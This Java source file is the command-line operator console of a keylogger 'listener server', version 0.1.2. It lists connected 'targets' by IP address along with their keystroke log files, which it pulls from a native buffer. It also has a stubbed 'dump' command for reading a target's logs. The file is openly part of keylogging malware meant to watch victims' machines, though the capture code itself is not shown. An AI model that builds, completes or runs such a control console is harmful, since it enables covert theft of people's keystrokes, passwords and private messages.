/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keyloggerinterface;
import java.awt.Frame;
import static java.util.Collections.list;
import java.util.Scanner;


/**
 *
 * @author Qu3b411
 */

public class KeyLoggerInterface extends Frame{

    public class keylogdata
    {
            long IPaddress;
            String Fname;
            private keylogdata(long a, String b)
            {
                IPaddress = a;
                Fname=b;
               // System.out.printf("here  %d \n",  IPaddress);
            }
    }    

    public native keylogdata[] getBuffer();
    
    /**
     * 
     * @return 
     */
 
    Scanner command = new Scanner(System.in);
    String commandStore;
    public  void Gui()
    {
        System.out.print("\n\nJava Interface Initiated, starting the command terminal for"
                + " the keylogger  V0.1.2\n\n");
        while (true)
        {
            System.out.print("KeyLogger_V0.1.2\\Command> ");
            commandStore = command.nextLine();
            switch(commandStore)
            {
                case "display":
                     System.out.println("listing connected ip addresses to the screen\n");
                     keylogdata[] tmp = getBuffer();
                     System.out.printf("[*] Connected Targets: %d\n\tIP ADDRESS\t\tASSOCIATED LOG FILE \n", tmp.length);
                     for (keylogdata tmp1 : tmp) {
                         System.out.printf("\t[*] %d.%d.%d.%d\t\t%s\n", (0xff000000 & tmp1.IPaddress)>>24,
                                                                     (0x00ff0000 & tmp1.IPaddress)>>16,
                                                                     (0x0000ff00 & tmp1.IPaddress)>> 8,
                                                                     (0x000000ff & tmp1.IPaddress)    ,
                                                                     tmp1.Fname);
                     }
                break;
                case "dump":
                    //logic goes here to dump the log of a specified IP address
                    System.out.println("dumping the logs of the specified IP\n");
                break;
                case "":
                break;
                case "help":
                    System.out.print("\nWelcome to the Keylogger listener server.\nThis server is curently listening for connections from your targets"
                            + "\n\nCommand\t\t\tDescription\n"
                            + "[*] display\t\tdisplays all ip addresses currently connected as well as\n\t\t\ttheir associated log files\n\n"
                            + "[*] dump <ip address>\tthe dump command will display the contents of an\n\t\t\txml file as it is at this point in time!\n\n"
                            + "[*] help \t\tdisplays this help message\n\n");
                break;
                default:
                    System.out.println("invalid command\n");
                break;
                    
                      
            }
        }
      
    
    }
}
